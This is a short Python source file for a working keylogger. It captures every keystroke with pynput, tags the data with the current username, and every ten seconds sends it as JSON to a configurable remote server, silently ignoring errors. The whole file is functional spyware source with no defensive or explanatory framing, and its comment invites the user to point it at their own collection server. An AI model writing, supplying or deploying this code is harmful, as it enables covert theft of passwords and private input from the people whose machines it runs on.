from pynput import keyboard
import requests
import threading
import json
import getpass

# -------------------------------
# Configuration
# -------------------------------

SERVER_IP = "127.0.0.1"   # Change to your server
PORT = "8080"
INTERVAL = 10

username = getpass.getuser()
buffer = ""

# -------------------------------
# Send Data to Server
# -------------------------------

def send_data():
    global buffer
    try:
        if buffer.strip():
            payload = json.dumps({
                "keyboardData": buffer,
                "username": username
            })

            # Send captured data to server
            requests.post(
                f"http://{SERVER_IP}:{PORT}",
                data=payload,
                headers={"Content-Type": "application/json"}
            )

            buffer = ""  # Clear buffer after sending

    except:
        pass

    # Repeat after interval
    threading.Timer(INTERVAL, send_data).start()

# -------------------------------
# Capture Keystrokes
# -------------------------------

def on_press(key):
    global buffer
    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
        elif key == keyboard.Key.tab:
            buffer += "\t"
        elif key == keyboard.Key.backspace:
            buffer = buffer[:-1]

# -------------------------------
# Start Program
# -------------------------------

send_data()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
